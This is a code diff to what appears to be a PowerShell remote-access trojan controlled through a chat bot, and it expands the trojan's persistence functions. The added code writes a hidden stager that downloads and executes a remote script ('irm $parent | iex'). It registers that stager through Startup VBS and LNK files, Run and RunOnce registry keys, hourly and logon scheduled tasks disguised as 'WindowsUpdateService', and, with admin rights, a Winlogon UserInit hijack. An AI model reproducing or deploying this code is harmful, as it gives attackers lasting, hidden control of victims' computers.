@@ -637,55 +637,314 @@ Function ScreenParty {
 # --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------
 
 Function AddPersistance {
+    $successCount = 0
+    $totalMethods = 0
+    $results = @()
+    
+    # Chemin du script de persistance
     $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
-    try {
-        # Télécharger le script depuis le parent et ajouter le token
-        $scriptContent = @"
+    $scriptContent = @"
 `$tk = `"$token`"
-`$parent = `"$parent`"
+`$global:parent = `"$parent`"
 irm `$parent | iex
 "@
-        $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8
-        
-        # Créer le script VBS de démarrage
-        $tobat = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
-"@
-        $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-        $tobat | Out-File -FilePath $pth -Force -Encoding ASCII
-        
+    
+    try {
+        # 1. Créer le script de persistance
+        $scriptContent | Out-File -FilePath $newScriptPath -Force -Encoding UTF8 -ErrorAction Stop
         if (Test-Path $newScriptPath) {
-            sendMsg -Message ":white_check_mark: ``Persistance Added! Script saved to: $newScriptPath`` :white_check_mark:"
-        }
-        else {
-            sendMsg -Message ":octagonal_sign: ``Failed to create persistence script`` :octagonal_sign:"
+            $totalMethods++
+            $successCount++
+            $results += "✓ Script créé: $newScriptPath"
         }
     }
     catch {
-        sendMsg -Message ":octagonal_sign: ``Error adding persistence: $($_.Exception.Message)`` :octagonal_sign:"
+        $results += "✗ Erreur création script: $($_.Exception.Message)"
     }
+    
+    # 2. Dossier de démarrage (Startup) - Méthode 1: VBS
+    try {
+        $startupVbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+        $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File ""$newScriptPath""", 0, True
+"@
+        $vbsContent | Out-File -FilePath $startupVbsPath -Force -Encoding ASCII -ErrorAction Stop
+        if (Test-Path $startupVbsPath) {
+            $totalMethods++
+            $successCount++
+            $results += "✓ Startup VBS ajouté"
+        }
+    }
+    catch {
+        $results += "✗ Erreur Startup VBS: $($_.Exception.Message)"
+    }
+    
+    # 3. Dossier de démarrage (Startup) - Méthode 2: LNK (Raccourci)
+    try {
+        $startupLnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($startupLnkPath)
+        $Shortcut.TargetPath = "powershell.exe"
+        $Shortcut.Arguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+        $Shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Themes"
+        $Shortcut.WindowStyle = 7  # Minimized
+        $Shortcut.Save()
+        if (Test-Path $startupLnkPath) {
+            $totalMethods++
+            $successCount++
+            $results += "✓ Startup LNK ajouté"
+        }
+    }
+    catch {
+        $results += "✗ Erreur Startup LNK: $($_.Exception.Message)"
+    }
+    
+    # 4. Clés de registre - HKCU Run
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsUpdateService"
+        $regValue = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction Stop
+        $totalMethods++
+        $successCount++
+        $results += "✓ Clé registre HKCU Run ajoutée"
+    }
+    catch {
+        $results += "✗ Erreur clé registre HKCU Run: $($_.Exception.Message)"
+    }
+    
+    # 5. Clés de registre - HKCU RunOnce
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+        $regName = "WindowsUpdateService"
+        $regValue = "powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction Stop
+        $totalMethods++
+        $successCount++
+        $results += "✓ Clé registre HKCU RunOnce ajoutée"
+    }
+    catch {
+        $results += "✗ Erreur clé registre HKCU RunOnce: $($_.Exception.Message)"
+    }
+    
+    # 6. Tâche planifiée - Au démarrage
+    try {
+        $taskName = "WindowsUpdateService"
+        $taskDescription = "Windows Update Service"
+        $taskAction = "powershell.exe"
+        $taskArguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+        
+        # Supprimer la tâche si elle existe déjà
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if ($existingTask) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        }
+        
+        # Créer la tâche planifiée
+        $action = New-ScheduledTaskAction -Execute $taskAction -Argument $taskArguments
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
+        
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -Force -ErrorAction Stop | Out-Null
+        
+        $totalMethods++
+        $successCount++
+        $results += "✓ Tâche planifiée (Au démarrage) créée"
+    }
+    catch {
+        $results += "✗ Erreur tâche planifiée (Au démarrage): $($_.Exception.Message)"
+    }
+    
+    # 7. Tâche planifiée - Toutes les heures (backup)
+    try {
+        $taskName = "WindowsUpdateServiceHourly"
+        $taskDescription = "Windows Update Service Hourly"
+        $taskAction = "powershell.exe"
+        $taskArguments = "-NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+        
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if ($existingTask) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        }
+        
+        $action = New-ScheduledTaskAction -Execute $taskAction -Argument $taskArguments
+        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 365)
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
+        
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -Force -ErrorAction Stop | Out-Null
+        
+        $totalMethods++
+        $successCount++
+        $results += "✓ Tâche planifiée (Toutes les heures) créée"
+    }
+    catch {
+        $results += "✗ Erreur tâche planifiée (Toutes les heures): $($_.Exception.Message)"
+    }
+    
+    # 8. Clé de registre - Winlogon (si admin)
+    if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+        try {
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+            $regName = "UserInit"
+            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).UserInit
+            if ($currentValue -and $currentValue -notlike "*$newScriptPath*") {
+                $newValue = "$currentValue, powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `"$newScriptPath`""
+                Set-ItemProperty -Path $regPath -Name $regName -Value $newValue -Force -ErrorAction Stop
+                $totalMethods++
+                $successCount++
+                $results += "✓ Clé registre Winlogon ajoutée (Admin)"
+            }
+        }
+        catch {
+            $results += "✗ Erreur clé registre Winlogon: $($_.Exception.Message)"
+        }
+    }
+    
+    # Résumé
+    $summary = "Persistance installée: $successCount/$totalMethods méthodes activées`n`n" + ($results -join "`n")
+    sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
 }
 
 Function RemovePersistance {
-    $removed = $false
-    if (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs") {
-        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs" -Force -ErrorAction SilentlyContinue
-        $removed = $true
+    $removedCount = 0
+    $results = @()
+    
+    # 1. Supprimer le script
+    try {
+        $scriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
+        if (Test-Path $scriptPath) {
+            Remove-Item -Path $scriptPath -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Script supprimé"
+        }
     }
-    if (Test-Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1") {
-        Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1" -Force -ErrorAction SilentlyContinue
-        $removed = $true
+    catch {
+        $results += "✗ Erreur suppression script: $($_.Exception.Message)"
     }
-    if (Test-Path "C:\Windows\Tasks\service.vbs") {
-        Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
-        $removed = $true
+    
+    # 2. Supprimer Startup VBS
+    try {
+        $startupVbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+        if (Test-Path $startupVbsPath) {
+            Remove-Item -Path $startupVbsPath -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Startup VBS supprimé"
+        }
     }
-    if ($removed) {
-        sendMsg -Message ":white_check_mark: ``Persistance Removed!`` :white_check_mark:"
+    catch {
+        $results += "✗ Erreur suppression Startup VBS: $($_.Exception.Message)"
+    }
+    
+    # 3. Supprimer Startup LNK
+    try {
+        $startupLnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
+        if (Test-Path $startupLnkPath) {
+            Remove-Item -Path $startupLnkPath -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Startup LNK supprimé"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression Startup LNK: $($_.Exception.Message)"
+    }
+    
+    # 4. Supprimer C:\Windows\Tasks\service.vbs
+    try {
+        $taskVbsPath = "C:\Windows\Tasks\service.vbs"
+        if (Test-Path $taskVbsPath) {
+            Remove-Item -Path $taskVbsPath -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Tasks VBS supprimé"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression Tasks VBS: $($_.Exception.Message)"
+    }
+    
+    # 5. Supprimer clé registre HKCU Run
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $regName = "WindowsUpdateService"
+        if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
+            Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Clé registre HKCU Run supprimée"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression clé registre HKCU Run: $($_.Exception.Message)"
+    }
+    
+    # 6. Supprimer clé registre HKCU RunOnce
+    try {
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+        $regName = "WindowsUpdateService"
+        if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) {
+            Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Clé registre HKCU RunOnce supprimée"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression clé registre HKCU RunOnce: $($_.Exception.Message)"
+    }
+    
+    # 7. Supprimer tâche planifiée (Au démarrage)
+    try {
+        $taskName = "WindowsUpdateService"
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if ($existingTask) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Tâche planifiée (Au démarrage) supprimée"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression tâche planifiée (Au démarrage): $($_.Exception.Message)"
+    }
+    
+    # 8. Supprimer tâche planifiée (Toutes les heures)
+    try {
+        $taskName = "WindowsUpdateServiceHourly"
+        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if ($existingTask) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
+            $removedCount++
+            $results += "✓ Tâche planifiée (Toutes les heures) supprimée"
+        }
+    }
+    catch {
+        $results += "✗ Erreur suppression tâche planifiée (Toutes les heures): $($_.Exception.Message)"
+    }
+    
+    # 9. Restaurer Winlogon (si admin)
+    if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+        try {
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+            $regName = "UserInit"
+            $currentValue = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).UserInit
+            if ($currentValue -and $currentValue -like "*copy.ps1*") {
+                $newValue = $currentValue -replace ", powershell.exe -NonI -NoP -Ep Bypass -W Hidden -File `".*copy.ps1`"", ""
+                Set-ItemProperty -Path $regPath -Name $regName -Value $newValue -Force -ErrorAction Stop
+                $removedCount++
+                $results += "✓ Clé registre Winlogon restaurée (Admin)"
+            }
+        }
+        catch {
+            $results += "✗ Erreur restauration clé registre Winlogon: $($_.Exception.Message)"
+        }
+    }
+    
+    # Résumé
+    if ($removedCount -gt 0) {
+        $summary = "Persistance supprimée: $removedCount éléments retirés`n`n" + ($results -join "`n")
+        sendMsg -Message ":white_check_mark: ``$summary`` :white_check_mark:"
     }
     else {
-        sendMsg -Message ":octagonal_sign: ``No persistence found to remove`` :octagonal_sign:"
+        sendMsg -Message ":octagonal_sign: ``Aucune persistance trouvée à supprimer`` :octagonal_sign:"
     }
 }
 
